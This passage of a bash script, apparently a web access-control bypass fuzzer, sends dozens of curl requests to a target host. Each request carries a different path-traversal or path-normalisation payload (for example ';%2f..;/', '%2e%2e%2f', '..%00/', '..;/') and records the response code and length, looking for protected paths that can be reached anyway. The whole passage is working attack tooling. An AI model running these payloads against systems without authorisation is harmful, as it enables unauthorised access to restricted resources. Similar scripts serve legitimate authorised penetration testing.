code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f;//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f;/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;/;/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e.$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2f%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e/%2e%2e/%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e/%2e%2e/%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../%2f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.././../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.././../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.././../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../.;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../.;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../.;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2e%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..///$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..///$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.;. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.;.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.;.$PAT" -H "$user_agent")
print
echo -n "Payload [ ;//%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;//.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;//../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//../../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//../../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;///.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;///../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;///..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;x ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x$PAT" -H "$user_agent")
print
echo -n "Payload [ ;x/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;x; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x;$PAT" -H "$user_agent")
print
echo -n "Payload [ & ]: "
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/&$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/&$PAT" -H "$user_agent")
print
echo -n "Payload [ % ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%$PAT" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent")
print
echo -n "Payload [ ../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ../%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ .././ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.././$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.././$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%00/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%0d/ ]"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%5c ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c$PAT" -H "$user_agent")
print
echo -n "Payload [ ..\ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\\$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\\$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%ff/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e%2e%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ .%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ %3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ %26 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%26$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%26$PAT" -H "$user_agent")
print
echo -n "Payload [ %23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ /. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.$PAT" -H "$user_agent")
print
echo -n "Payload [ ? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/?$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/?$PAT" -H "$user_agent")
print
echo -n "Payload [ ?? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/??$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/??$PAT" -H "$user_agent")
print
echo -n "Payload [ ??? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/???$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/???$PAT" -H "$user_agent")
print
echo -n "Payload [ // ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///$PAT" -H "$user_agent")
print
echo -n "Payload [ /./ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//./$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//./$PAT" -H "$user_agent")
print
echo -n "Payload [ .//./ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.//./$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.//./$PAT" -H "$user_agent")
print
echo -n "Payload [ //?anything ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///?anything$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///?anything$PAT" -H "$user_agent")
print
echo -n "Payload [ # ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/#$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/#$PAT" -H "$user_agent")
print
echo -n "Payload [ / ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//$PAT" -H "$user_agent")
print
echo -n "Payload [ /.randomstring ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.randomstring$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.randomstring$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ .html ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.html$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.html$PAT" -H "$user_agent")
print
echo -n "Payload [ %20/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20/$PAT" -H "$user_agent")
print
echo -n "Payload [ %20$PAT%20/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT%20/$PAT" -H "$user_agent"
